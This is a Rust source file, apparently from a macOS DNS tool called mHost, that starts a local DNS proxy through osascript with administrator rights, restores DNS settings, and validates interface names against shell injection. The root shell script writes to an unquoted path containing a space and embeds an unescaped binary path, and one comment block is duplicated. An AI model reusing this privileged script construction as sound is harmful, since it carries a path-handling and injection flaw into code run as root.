use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

// ---------------------------------------------------------------------------
// Runtime directory + signal/state file paths
// ---------------------------------------------------------------------------
//
// **fix (H1, issue #90)**: 把 DNS mode 的临时文件从 world-writable 的
// /tmp 迁移到用户私有目录 `~/Library/Application Support/mHost/.runtime/`，
// 并全部设 mode 0o600。/tmp 下的旧文件在 cleanup_stale_proxy 启动时一次
// 性清理（向后兼容老版本升级）。
//
// 这些路径之前是 `const &str`，改成 `fn` 因为：
//   1. runtime_dir 依赖环境（`dirs::data_dir()` 或 `$MHOST_RUNTIME_DIR`），
//      无法在 const 上下文计算。
//   2. 测试可设 `MHOST_RUNTIME_DIR=/tmp/mhost-test-xxx` 隔离，不用担心
//      污染用户的真实 runtime 目录。

/// mhost DNS mode runtime 目录路径。
///
/// 默认 `~/Library/Application Support/mHost/.runtime/` (macOS)。
/// 测试可通过 `MHOST_RUNTIME_DIR` 环境变量覆盖到 tempdir。
pub fn runtime_dir() -> PathBuf {
    if let Ok(p) = std::env::var("MHOST_RUNTIME_DIR") {
        return PathBuf::from(p);
    }
    let base = dirs::data_dir()
        .or_else(dirs::home_dir)
        .unwrap_or_else(|| PathBuf::from("/tmp"));
    base.join("mHost").join(".runtime")
}

/// 确保 runtime dir 存在，权限 0o700（owner only）。
pub fn ensure_runtime_dir() -> std::io::Result<PathBuf> {
    use std::os::unix::fs::PermissionsExt;
    let dir = runtime_dir();
    if !dir.exists() {
        std::fs::create_dir_all(&dir)?;
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(dir)
}

/// DNS proxy PID 文件路径。mode 0o600（root 创建）。
pub fn proxy_pid_file() -> PathBuf {
    runtime_dir().join("mhost-dns-proxy.pid")
}

/// 启用 DNS 模式前的原始 DNS（mhost 写入，proxy 读取用于退出恢复）。
/// mode 0o600（owner only）。
pub fn original_dns_file() -> PathBuf {
    runtime_dir().join("mhost-dns-original.txt")
}

/// Proxy 关闭信号文件：mhost 写入 "shutdown"，proxy 轮询检测后做清理退出。
/// mode 0o600（owner only）—— proxy 是 root 启动的，mhost 是用户态，但
/// 两者都用同一 uid 运行（mhost 通过 osascript 提权起 proxy）。如果
/// proxy 不是 root 启动，shutdown 写不进去是更安全的行为（外部攻击者
/// 即使有 /tmp 写权限也无法触发）。
pub fn shutdown_signal_file() -> PathBuf {
    runtime_dir().join("mhost-dns-shutdown.signal")
}

/// Disable 路径的恢复标记：proxy 5s 内没退出 → 下次启动 mhost 会看到
/// 这个标记并强制走 `force_dns_restore_if_needed` 兜底（写 Empty 给活跃
/// 接口）。仅在确实出现 5s 超时时保留，正常路径会清理掉。
/// mode 0o600。
pub fn disable_recovery_marker_file() -> PathBuf {
    runtime_dir().join("mhost-dns-disable-recovery.marker")
}

/// 临时脚本名前缀（用于 osascript 提权）。
const TEMP_SCRIPT_PREFIX: &str = "mhost-dns-";

/// 等 proxy 退出的最大时长。
const PROXY_SHUTDOWN_TIMEOUT_SECS: u64 = 5;

/// 一次性的「老 /tmp 路径清理」：升级用户从老版本迁移过来时，
/// 旧路径下的文件不再被读写，会成为孤儿（其他用户可见，可能含 DNS 信息）。
/// 在 cleanup_stale_proxy 启动时删一下。
pub(crate) fn cleanup_legacy_tmp_files() {
    const LEGACY_PATHS: &[&str] = &[
        "/tmp/mhost-dns-proxy.pid",
        "/tmp/mhost-dns-original.txt",
        "/tmp/mhost-dns-shutdown.signal",
        "/tmp/mhost-dns-disable-recovery.marker",
    ];
    for path in LEGACY_PATHS {
        // 忽略错误（旧版本可能没创建过这些文件）
        let _ = std::fs::remove_file(path);
    }
}

/// 平台操作错误。
#[derive(Debug, thiserror::Error)]
pub enum PlatformError {
    #[error("failed to get system DNS: {0}")]
    GetDns(String),
    #[error("failed to set system DNS: {0}")]
    SetDns(String),
    #[error("failed to restore system DNS: {0}")]
    RestoreDns(String),
    #[error("failed to detect active network interface: {0}")]
    DetectInterface(String),
    #[error("invalid interface name: {0}")]
    InvalidInterfaceName(String),
    #[error("failed to write temp script: {0}")]
    TempScript(String),
    #[error("interface name is empty")]
    EmptyInterfaceName,
}

/// 接口名白名单：只允许字母、数字、空格、点、下划线、连字符、斜杠。
/// 这是 macOS 系统接口名常见字符集（如 "USB 10/100/1000 LAN"、"Wi-Fi"）。
/// 仍拒绝任何 shell 元字符（` ` $ \ & ; | < > ( ) { } [ ] ! ' " ` ? * ~ # % = : 等）。
fn is_valid_interface_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == ' ' || c == '.' || c == '_' || c == '-' || c == '/'
}

/// 验证接口名是否在白名单内。空字符串直接拒绝。
/// **fix（proxy self-cleanup）**：proxy 调 networksetup 时也要校验，
/// 所以改 pub 让 proxy 复用。
pub fn validate_interface_name(name: &str) -> Result<(), PlatformError> {
    if name.is_empty() {
        return Err(PlatformError::EmptyInterfaceName);
    }
    if !name.chars().all(is_valid_interface_char) {
        return Err(PlatformError::InvalidInterfaceName(format!(
            "name contains disallowed characters: {:?}",
            name
        )));
    }
    Ok(())
}

/// 生成下一个临时脚本的 PathBuf。文件名带递增后缀，避免 race。
fn next_temp_script_path() -> Result<PathBuf, PlatformError> {
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, Ordering::Relaxed);
    let name = format!("{}{}-{}.sh", TEMP_SCRIPT_PREFIX, std::process::id(), n);
    Ok(std::env::temp_dir().join(name))
}

/// 把 shell 脚本写到临时文件并设置 0o700，返回文件路径。
fn write_temp_script(content: &str) -> Result<PathBuf, PlatformError> {
    use std::os::unix::fs::OpenOptionsExt;
    let path = next_temp_script_path()?;
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o700)
        .open(&path)
        .map_err(|e| PlatformError::TempScript(format!("create {:?}: {}", path, e)))?;
    use std::io::Write;
    let mut writer = std::io::BufWriter::new(file);
    writer
        .write_all(content.as_bytes())
        .map_err(|e| PlatformError::TempScript(format!("write {:?}: {}", path, e)))?;
    writer
        .flush()
        .map_err(|e| PlatformError::TempScript(format!("flush {:?}: {}", path, e)))?;
    Ok(path)
}

/// 使用 osascript 提权执行 shell 脚本。
///
/// **安全设计**：把脚本内容写到临时文件（0o700），osascript 只接收**文件路径**，
/// 路径通过 AppleScript 的 `quoted form of` 转义。任何 shell 元字符都进不到
/// 拼接的 AppleScript 字符串里。
fn run_with_privileges(script_body: &str) -> Result<std::process::Output, String> {
    let path = write_temp_script(script_body).map_err(|e| format!("temp script failed: {}", e))?;
    // 失败时清理临时文件
    let result = invoke_osascript(&path);
    let _ = std::fs::remove_file(&path);
    result
}

/// 调 osascript 让它以管理员权限执行临时脚本。脚本路径已写盘，
/// 字符串拼接只发生在 AppleScript 字面量内，并用 `quoted form of POSIX path of`
/// 走 AppleScript 自身的转义机制，不依赖手工 shell escape。
fn invoke_osascript(path: &std::path::Path) -> Result<std::process::Output, String> {
    let path_str = path.to_string_lossy();
    let apple_script = format!(
        "do shell script \"sh \" & quoted form of POSIX path of \"{}\" with administrator privileges",
        // 双重 escape 是因为我们要塞进 AppleScript 字符串字面量
        path_str.replace('\\', "\\\\").replace('"', "\\\"")
    );
    Command::new("osascript")
        .args(["-e", &apple_script])
        .output()
        .map_err(|e| format!("osascript failed: {}", e))
}

/// 获取当前系统 DNS 服务器列表。
///
/// **Fallback chain**（fix: 不要用公共 DNS 覆盖用户实际的 DNS）：
/// 1. `networksetup -getdnsservers <port>` —— 用户在 System Settings
///    里手动配的 DNS。如果非空，直接返回（这是最权威的）。
/// 2. `ipconfig getoption <device> domain_name_server` —— DHCP 推的
///    DNS。`networksetup` 在「DHCP 推但用户没在 System Settings 里
///    确认」的情况下会返回空，但系统实际在用 DHCP DNS。这一步能补上。
/// 3. `[8.8.8.8, 1.1.1.1]` —— 上面两个都空时的兜底（系统真没配 DNS，
///    例如离线/air-gapped）。调用方看到这种返回值应该打 warning log。
pub fn get_system_dns() -> Result<Vec<String>, PlatformError> {
    let port = get_active_network_interface()?;

    // Tier 1: 用户手动配的 DNS（在 System Settings 里能看到）
    if let Ok(servers) = networksetup_get_dns(&port) {
        if !servers.is_empty() {
            return Ok(servers);
        }
    }

    // Tier 2: DHCP 推的 DNS（networksetup 看不到，但系统实际在用）
    if let Some(device) = get_active_network_device() {
        if let Ok(servers) = ipconfig_get_dns(&device) {
            if !servers.is_empty() {
                return Ok(servers);
            }
        }
    }

    // Tier 3: 上面两个都空 → 系统真没 DNS。返回公共 resolver 兜底，
    // 调用方（commands/dns.rs）会打 warning 告诉用户。
    Ok(vec!["8.8.8.8".to_string(), "1.1.1.1".to_string()])
}

/// `networksetup -getdnsservers <port>` —— 用户在 System Settings 里
/// 手动配的 DNS。返回空 vec 表示「没手动配」（常见于纯 DHCP 场景）。
fn networksetup_get_dns(port: &str) -> Result<Vec<String>, PlatformError> {
    let output = Command::new("networksetup")
        .args(["-getdnsservers", port])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("networksetup command failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "networksetup failed: {}",
            stderr
        )));
    }
    parse_dns_servers(&String::from_utf8_lossy(&output.stdout))
}

/// `ipconfig getoption <device> domain_name_server` —— DHCP 推的 DNS。
/// 每行一个 IP（legacy 版本可能空格分隔），由 `parse_dns_servers` 统一解析。
fn ipconfig_get_dns(device: &str) -> Result<Vec<String>, PlatformError> {
    let output = Command::new("ipconfig")
        .args(["getoption", device, "domain_name_server"])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("ipconfig failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "ipconfig failed: {}",
            stderr
        )));
    }
    parse_dns_servers(&String::from_utf8_lossy(&output.stdout))
}

/// 默认路由对应的 BSD 设备名（如 `en0`），供 ipconfig 使用。
/// 失败返回 None（get_system_dns 走 Tier 3 兜底）。
fn get_active_network_device() -> Option<String> {
    let output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_route_interface(&stdout)
}

/// 在 macOS 上启用 DNS 模式：
///   1. mhost 把 original DNS 写到 `$RUNTIME_DIR/mhost-dns-original.txt`
///      （用户态写自己私有目录，不需要 root）
///   2. mhost 创建 `$RUNTIME_DIR/mhost-dns-shutdown.signal`，content="running"，
///      mode=0o600（owner only；proxy 是同 uid 提权启动，能写）
///   3. osascript 提权跑脚本：起 proxy + 改系统 DNS = 127.0.0.1
///
/// **fix（proxy self-cleanup）**：把 original DNS 和 signal file 提前
/// 写到 runtime dir（不需要 root），让 proxy 在退出时能自己读 original +
/// 检测 signal 文件，**不需要再走 osascript 弹 sudo 框**。
///
/// **fix（H1, issue #90）**：从 /tmp 迁移到 ~/Library/Application Support/mHost/.runtime/，
/// mode 从 0o666 改 0o600。/tmp 旧路径在 cleanup_stale_proxy 启动时清理。
pub fn enable_dns_mode(dns_port: u16, original: &[String]) -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    // 0. 确保 runtime dir 存在（mode 0o700）
    ensure_runtime_dir()
        .map_err(|e| PlatformError::SetDns(format!("create runtime dir: {}", e)))?;

    // 1. 写 original DNS 文件（用户态，不需要 root）
    //    proxy 启动时读这个文件，退出时按它恢复系统 DNS
    let original_path = original_dns_file();
    let original_content = original.join("\n");
    write_atomic_0600(&original_path, original_content.as_bytes())
        .map_err(|e| PlatformError::SetDns(format!("write original dns file: {}", e)))?;

    // 2. 写 signal 文件（0o600 owner-only；proxy 是同 uid 提权启动，能写）
    write_signal_file(&shutdown_signal_file(), "running")
        .map_err(|e| PlatformError::SetDns(format!("write shutdown signal file: {}", e)))?;

    // 3. 构建 dns-proxy 二进制路径（与 mhost 同目录）
    let proxy_path = std::env::current_exe()
        .ok()
        .and_then(|p| {
            p.parent()
                .map(|dir| dir.join("mhost-dns-proxy").to_string_lossy().to_string())
        })
        .unwrap_or_else(|| "mhost-dns-proxy".to_string());

    // 4. osascript 提权跑脚本
    // PID 文件内容: "{pid} {binary_path}\n" 供 cleanup_stale_proxy 校验 cmdline
    let pid_file = proxy_pid_file();
    let script_body = format!(
        r#"#!/bin/sh
set -e
"{proxy}" --listen 53 --target {dns_port} &
echo "$! {proxy}" > {pid_file}
disown
networksetup -setdnsservers {interface} 127.0.0.1
"#,
        proxy = proxy_path,
        dns_port = dns_port,
        pid_file = pid_file.display(),
        interface = interface,
    );
    let output = run_with_privileges(&script_body)
        .map_err(|e| PlatformError::SetDns(format!("enable dns mode failed: {}", e)))?;
    if !output.status.success() {
        // 回滚：清理刚才写的文件
        let _ = std::fs::remove_file(&original_path);
        let _ = std::fs::remove_file(shutdown_signal_file());
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::SetDns(format!("command failed: {}", stderr)));
    }
    Ok(())
}

/// 原子写入文件，mode 0o600（owner only）。
///
/// 流程：写 `<path>.tmp`（mode 0o600）→ sync → rename 到目标。
/// POSIX rename 是原子的，读者要么看到旧 inode（旧内容），要么看到新
/// inode（新内容），永远看不到中间空态。
pub(crate) fn write_atomic_0600(path: &Path, content: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let parent = path.parent().unwrap_or_else(|| Path::new("."));
    // tmp 文件放在同一目录下，确保 rename 在同一 filesystem 是原子的
    let file_name = path
        .file_name()
        .and_then(|s| s.to_str())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid path"))?;
    let tmp_path = parent.join(format!("{}.tmp", file_name));
    {
        let mut opts = std::fs::OpenOptions::new();
        opts.write(true).create(true).truncate(true).mode(0o600);
        let mut f = opts.open(&tmp_path)?;
        f.write_all(content)?;
        f.sync_all()?;
    }
    std::fs::rename(&tmp_path, path)
}

/// 把 signal 文件写入指定内容，原子 + sync，mode 0o600。
///
/// **fix（B2 review）**：用「写 tmp + atomic rename」避免 truncate → write_all
/// 之间的竞态窗口。旧实现用 `OpenOptions::create().truncate()`，open 成功的
/// 那一瞬文件就被清空；如果 proxy 恰好在 open 和 write_all 之间读
/// `check_shutdown_signal`，会读到空字符串误触发 shutdown（之前 receiver
/// 端把「非 running」都当 shutdown）。
pub(crate) fn write_signal_file(path: &Path, content: &str) -> std::io::Result<()> {
    write_atomic_0600(path, content.as_bytes())
}

/// 在 macOS 上禁用 DNS 模式：
///   1. 写 "shutdown" 到 signal 文件（用户态，不需要 root）
///   2. proxy 轮询检测到，**自己以 root 身份**调 networksetup 恢复
///      DNS，然后退出
///   3. 等 proxy 退出（最多 5s）
///
/// **fix（proxy self-cleanup）**：之前用 osascript 弹 sudo 框让 mhost
/// 在 macOS 上禁用 DNS 模式：
///   1. 写 "shutdown" 到 signal 文件（用户态，不需要 root）
///   2. proxy 轮询检测到，**自己以 root 身份**调 networksetup 恢复
///      DNS，然后退出
///   3. 等 proxy 退出（最多 5s）
///   4. **interactive=true 且 proxy 未在 5s 内完成恢复**（timeout 或
///      proxy 已经不存在）：以管理员身份自己调
///      `networksetup -setdnsservers <iface> <original|Empty>` 兜底，
///      匹配 enable 路径的 sudo 行为。
///
/// **fix（proxy self-cleanup）**：disable 不再默认弹 sudo；先让 proxy
/// 自管，proxy 真不行时再让 mhost 用户态走 osascript。
///
/// **fix（bug 2，DNS 恢复兜底）**：
/// - 调用一开始就写恢复标记 `disable_recovery_marker_file()`，**先于**
///   任何 proxy 交互。如果后续没成功恢复（proxy timeout / 死了 /
///   interactive 路径的 osascript 也失败），下次启动时 `try_recover_dns`
///   看到标记会调 `force_dns_restore_if_needed` 强退。
/// - marker **只在 DNS 确实恢复成功**时被删除；任何恢复失败的分支都
///   保留 marker + 返回 Err。
///
/// **fix（disable-time sudo fallback，interactive）**：
/// - interactive=true（UI 调用）：proxy 没在 5s 内恢复、或 proxy 已死，
///   都用 `run_with_privileges` 走 `networksetup -setdnsservers` 兜底，
///   让用户当场看到 sudo 框 + DNS 恢复成功。`servers` 为空时传 `Empty`。
/// - interactive=false（退出清理）：**不弹 sudo 框**（用户可能不在场），
///   保留 marker + 返回 Err，让下次启动 try_recover_dns 走
///   `force_dns_restore_if_needed`。
///
/// 注：参数 `servers` 保留 API 兼容：proxy 用自己的 original.txt 恢复，
/// 但 interactive 分支用 `servers` 决定要恢复成什么 IP（proxy 不在的
/// 兜底场景）。
pub fn disable_dns_mode(servers: &[String], interactive: bool) -> Result<(), PlatformError> {
    // 0. 写恢复标记（用户态、不需 root）。如果本次 disable 任何分支没
    //    成功恢复 DNS，marker 会保留 → 下次启动 try_recover_dns 看到标记
    //    会调 force_dns_restore_if_needed 强退。
    ensure_runtime_dir().map_err(|e| {
        PlatformError::RestoreDns(format!("create runtime dir for recovery marker: {}", e))
    })?;
    write_recovery_marker()
        .map_err(|e| PlatformError::RestoreDns(format!("write recovery marker: {}", e)))?;

    // 内部 helper：interactive 分支用 osascript 兜底恢复系统 DNS。
    // 只负责调 networksetup；marker / 临时文件的清理由调用方根据
    // 成功 / 失败统一处理。
    fn osascript_restore(servers: &[String]) -> Result<(), PlatformError> {
        let interface = get_active_network_interface()?;
        validate_interface_name(&interface)?;
        let target = if servers.is_empty() {
            "Empty".to_string()
        } else {
            servers.join(" ")
        };
        let script_body = format!(
            "networksetup -setdnsservers {iface} {target}",
            iface = interface,
            target = target
        );
        let out = run_with_privileges(&script_body).map_err(|e| {
            PlatformError::RestoreDns(format!("invoke osascript for disable-time restore: {}", e))
        })?;
        if !out.status.success() {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return Err(PlatformError::RestoreDns(format!(
                "disable-time restore failed: {}",
                stderr
            )));
        }
        Ok(())
    }

    // 1. 检查 proxy 是否真的在跑 —— 如果在跑，写 signal 让它自管；
    //    如果不在（已崩溃/没启过），跳到分支 2。
    if let Some(proxy_pid) = read_proxy_pid() {
        // proxy 存在（PID 文件可读）。检查进程是否还活。
        let alive = unsafe { libc::kill(proxy_pid as libc::pid_t, 0) == 0 };
        if alive {
            // 写 "shutdown" signal（用户态，不需要 root）
            write_signal_file(&shutdown_signal_file(), "shutdown")
                .map_err(|e| PlatformError::RestoreDns(format!("write shutdown signal: {}", e)))?;
            eprintln!("[mHost] dns mode disable: signal sent to proxy, waiting for exit");

            // 等 proxy 退出：循环检查 PID 是否还活，最多 5 秒
            let deadline = std::time::Instant::now()
                + std::time::Duration::from_secs(PROXY_SHUTDOWN_TIMEOUT_SECS);
            while std::time::Instant::now() < deadline {
                std::thread::sleep(std::time::Duration::from_millis(100));
                if unsafe { libc::kill(proxy_pid as libc::pid_t, 0) != 0 } {
                    // proxy 已退出 → restore_dns_and_exit 已恢复系统 DNS。
                    // 全部临时文件 + marker 都可以清掉。
                    let _ = std::fs::remove_file(proxy_pid_file());
                    let _ = std::fs::remove_file(original_dns_file());
                    // signal 文件由 proxy 自己清理（restore_dns_and_exit）
                    let _ = std::fs::remove_file(disable_recovery_marker_file());
                    return Ok(());
                }
            }
            // 5s 超时：proxy 还活着但没自管恢复
            eprintln!(
                "[mHost] dns mode disable: proxy did not exit within {}s",
                PROXY_SHUTDOWN_TIMEOUT_SECS
            );
            if interactive {
                // UI 路径：弹 sudo 让用户当场恢复
                if osascript_restore(servers).is_ok() {
                    // 兜底成功：清全部文件 + marker
                    let _ = std::fs::remove_file(proxy_pid_file());
                    let _ = std::fs::remove_file(original_dns_file());
                    let _ = std::fs::remove_file(shutdown_signal_file());
                    let _ = std::fs::remove_file(disable_recovery_marker_file());
                    return Ok(());
                }
                // 兜底也失败：保留 marker 给下次启动 try_recover_dns
            }
            // 非 interactive 或 interactive 兜底失败：保留 marker
            return Err(PlatformError::RestoreDns(format!(
                "dns proxy did not exit within {}s; recovery marker left at {}",
                PROXY_SHUTDOWN_TIMEOUT_SECS,
                disable_recovery_marker_file().display()
            )));
        }
        // PID 文件存在但进程死了：清理 PID 文件（marker 保留到下面）
        let _ = std::fs::remove_file(proxy_pid_file());
    }

    // 2. proxy 不在（早死 / 从没启过 / PID 死后到这里）
    if interactive {
        // UI 路径：proxy 都没在，肯定没人恢复 DNS，必须 sudo 兜底
        if osascript_restore(servers).is_ok() {
            let _ = std::fs::remove_file(original_dns_file());
            let _ = std::fs::remove_file(shutdown_signal_file());
            let _ = std::fs::remove_file(disable_recovery_marker_file());
            return Ok(());
        }
        // 兜底失败：保留 marker 给下次启动 try_recover_dns
        return Err(PlatformError::RestoreDns(format!(
            "proxy not running and osascript restore failed; recovery marker left at {}",
            disable_recovery_marker_file().display()
        )));
    }
    // 非 interactive（exit 清理）：proxy 没恢复 DNS → marker 必须保留，
    // 下次启动 try_recover_dns 看到会调 force_dns_restore_if_needed。
    // 清理 PID / original / signal 文件（PID 已经在上面清掉了）。
    let _ = std::fs::remove_file(original_dns_file());
    let _ = std::fs::remove_file(shutdown_signal_file());
    if !servers.is_empty() {
        eprintln!(
            "[mHost] dns mode disable (exit cleanup): proxy not running; \
             intended restore target was {:?}; recovery marker preserved for next launch.",
            servers
        );
    }
    Err(PlatformError::RestoreDns(format!(
        "proxy not running; recovery marker left at {} for next-launch force restore",
        disable_recovery_marker_file().display()
    )))
}

/// 写恢复标记文件（"pending"，0o600，sync 落盘）。
///
/// 用途：disable 启动时先于任何 proxy 交互写下；正常路径会删掉；
/// 5s 超时 / 进程被 kill 等异常路径会保留 → 下次启动 `try_recover_dns`
/// 看到标记，调 `force_dns_restore_if_needed` 兜底。
fn write_recovery_marker() -> std::io::Result<()> {
    let marker = disable_recovery_marker_file();
    write_atomic_0600(&marker, b"pending")
}

/// 上次退出没成功恢复时，下一次启动的兜底：以 admin 身份调用
/// `networksetup -setdnsservers <iface> Empty`（DHCP），删 marker。
/// 仅在「确实出现恢复失败」时被调用 —— osascript sudo 弹窗
/// 只在异常路径出现，正常退出零成本。
pub fn force_dns_restore_if_needed() -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    let script_body = format!(
        "networksetup -setdnsservers {iface} Empty",
        iface = interface
    );
    let out = run_with_privileges(&script_body).map_err(|e| {
        PlatformError::RestoreDns(format!("invoke osascript for force restore: {}", e))
    })?;
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(PlatformError::RestoreDns(format!(
            "force restore failed: {}",
            stderr
        )));
    }

    let _ = std::fs::remove_file(disable_recovery_marker_file());
    Ok(())
}

/// 从 PID 文件读出 proxy 的 PID（如果可读 + 可解析）。
fn read_proxy_pid() -> Option<u32> {
    let content = std::fs::read_to_string(proxy_pid_file()).ok()?;
    content.split_whitespace().next()?.parse().ok()
}

/// 清理残留的 dns-proxy 进程（应用启动时调用）。
///
/// **安全修复（#81）**：PID 文件不再仅含 PID，还含 `mhost-dns-proxy` 路径。
/// 清理时先 `kill(pid, 0)` 检查存活，再用 `ps -p` 校验进程名是 `mhost-dns-proxy`
/// 才 SIGTERM；防止误杀其他进程（PID 重用）。
///
/// **fix（systematic DNS logic review）**：之前用 `comm.trim().contains("mhost-dns-proxy")`
/// 模糊匹配，攻击者或巧合的二进制名（如 `not-mhost-dns-proxy`）会被错杀。
/// 现在从 PID 文件读出原始 binary_path，与 `ps -o comm=` 做**精确相等比较**。
///
/// **fix（H1, issue #90）**：启动时也清掉老 /tmp 路径下的残留文件
/// （用户从老版本升级过来时会留有这些孤儿文件，world-readable 可能含 DNS 信息）。
pub fn cleanup_stale_proxy() {
    // H1: 先清理老 /tmp 路径下的孤儿文件
    cleanup_legacy_tmp_files();

    let pid_path = proxy_pid_file();
    let content = match std::fs::read_to_string(&pid_path) {
        Ok(c) => c,
        Err(_) => return,
    };
    // 格式："{pid} {binary_path}\n"
    let mut parts = content.split_whitespace();
    if let Some(pid_str) = parts.next() {
        if let Ok(pid) = pid_str.trim().parse::<u32>() {
            // 取出当时记录的 binary_path，用于精确比对
            let recorded_binary = parts.collect::<Vec<_>>().join(" ");
            let expected_comm = std::path::Path::new(&recorded_binary)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| recorded_binary.clone());

            let alive = unsafe { libc::kill(pid as libc::pid_t, 0) == 0 };
            if !alive {
                eprintln!(
                    "[mHost] Stale dns-proxy pid {} not alive, skipping kill",
                    pid
                );
            } else {
                // 校验进程名精确匹配当时记录的 binary_path basename。
                // 防止 PID 重用时被同 PID 的其他进程（如 `not-mhost-dns-proxy`）误杀。
                //
                // 注：macOS 的 `ps -o comm=` 返回完整可执行路径，Linux 只
                // 返回 basename。两侧都取 basename 做精确比较，跨平台语义一致。
                let ps_output = Command::new("ps")
                    .args(["-p", &pid.to_string(), "-o", "comm="])
                    .output();
                let is_proxy = match ps_output {
                    Ok(out) if out.status.success() => {
                        let comm = String::from_utf8_lossy(&out.stdout);
                        let comm_basename = std::path::Path::new(comm.trim())
                            .file_name()
                            .map(|s| s.to_string_lossy().to_string())
                            .unwrap_or_else(|| comm.trim().to_string());
                        comm_basename == expected_comm
                    }
                    _ => false,
                };
                if is_proxy {
                    unsafe {
                        libc::kill(pid as libc::pid_t, libc::SIGTERM);
                    }
                    eprintln!("[mHost] Killed stale dns-proxy process (pid {})", pid);
                } else {
                    eprintln!(
                        "[mHost] pid {} alive but cmdline basename != expected '{}', skipping kill",
                        pid, expected_comm
                    );
                }
            }
        }
    }
    let _ = std::fs::remove_file(pid_path);
}

/// 获取当前活跃的网络接口名（Hardware Port）。
/// **fix（proxy self-cleanup）**：proxy 调 networksetup 时也要拿接口，
/// 所以改 pub 让 proxy 复用。
pub fn get_active_network_interface() -> Result<String, PlatformError> {
    // 1. 获取默认路由对应的设备名（如 en0）
    let route_output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .map_err(|e| PlatformError::DetectInterface(format!("route command failed: {}", e)))?;

    if !route_output.status.success() {
        let stderr = String::from_utf8_lossy(&route_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "route failed: {}",
            stderr
        )));
    }

    let route_stdout = String::from_utf8_lossy(&route_output.stdout);
    let device = parse_route_interface(&route_stdout).ok_or_else(|| {
        PlatformError::DetectInterface("could not parse default interface from route output".into())
    })?;

    // 2. 通过 networksetup 找到设备名对应的 Hardware Port
    let list_output = Command::new("networksetup")
        .args(["-listallhardwareports"])
        .output()
        .map_err(|e| {
            PlatformError::DetectInterface(format!("networksetup command failed: {}", e))
        })?;

    if !list_output.status.success() {
        let stderr = String::from_utf8_lossy(&list_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "networksetup failed: {}",
            stderr
        )));
    }

    let list_stdout = String::from_utf8_lossy(&list_output.stdout);
    let port = parse_hardware_port(&list_stdout, &device).ok_or_else(|| {
        PlatformError::DetectInterface(format!("no hardware port found for device '{}'", device))
    })?;
    // 验证接口名（防御 networksetup 输出被恶意修改/异常字符）
    validate_interface_name(&port)?;
    Ok(port)
}

/// 从 `route -n get default` 输出中解析接口设备名。
fn parse_route_interface(output: &str) -> Option<String> {
    for line in output.lines() {
        let line = line.trim();
        if line.starts_with("interface:") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return Some(parts[1].to_string());
            }
        }
    }
    None
}

/// 从 `networksetup -listallhardwareports` 输出中根据设备名查找 Hardware Port。
fn parse_hardware_port(output: &str, device: &str) -> Option<String> {
    let mut current_port: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();
        if let Some(stripped) = line.strip_prefix("Hardware Port:") {
            let port = stripped.trim().to_string();
            current_port = Some(port);
        } else if let Some(stripped) = line.strip_prefix("Device:") {
            let dev = stripped.trim();
            if dev == device {
                return current_port.clone();
            }
        }
    }

    None
}

/// 从 `networksetup -getdnsservers` 输出中解析 DNS 服务器列表。
fn parse_dns_servers(output: &str) -> Result<Vec<String>, PlatformError> {
    let trimmed = output.trim();

    if trimmed.contains("There aren't any DNS Servers set")
        || trimmed.is_empty()
        || trimmed == "Empty"
    {
        return Ok(vec![]);
    }

    let servers: Vec<String> = trimmed
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    Ok(servers)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::PermissionsExt;

    // -----------------------------------------------------------------------
    // Runtime dir + signal file perm tests（fix H1, issue #90）
    // -----------------------------------------------------------------------

    /// 回归测试（H1）：runtime dir 路径受 `MHOST_RUNTIME_DIR` 环境变量控制。
    /// 测试场景：env var 指向 tempdir → 所有 *file() 函数都返回该目录下路径。
    #[test]
    fn test_runtime_dir_respects_env_var() {
        let _guard = serial_runtime_dir_test();
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());

        let rdir = runtime_dir();
        assert_eq!(rdir, dir.path(), "runtime_dir 应等于 MHOST_RUNTIME_DIR");

        assert_eq!(
            original_dns_file(),
            dir.path().join("mhost-dns-original.txt")
        );
        assert_eq!(
            shutdown_signal_file(),
            dir.path().join("mhost-dns-shutdown.signal")
        );
        assert_eq!(
            disable_recovery_marker_file(),
            dir.path().join("mhost-dns-disable-recovery.marker")
        );
        assert_eq!(proxy_pid_file(), dir.path().join("mhost-dns-proxy.pid"));

        std::env::remove_var("MHOST_RUNTIME_DIR");
    }

    /// 回归测试（H1）：ensure_runtime_dir 创建目录并设 mode 0o700。
    #[test]
    fn test_ensure_runtime_dir_creates_with_0o700() {
        let _guard = serial_runtime_dir_test();
        let parent = tempfile::tempdir().unwrap();
        let target = parent.path().join("runtime");
        std::env::set_var("MHOST_RUNTIME_DIR", &target);

        // 初始不存在
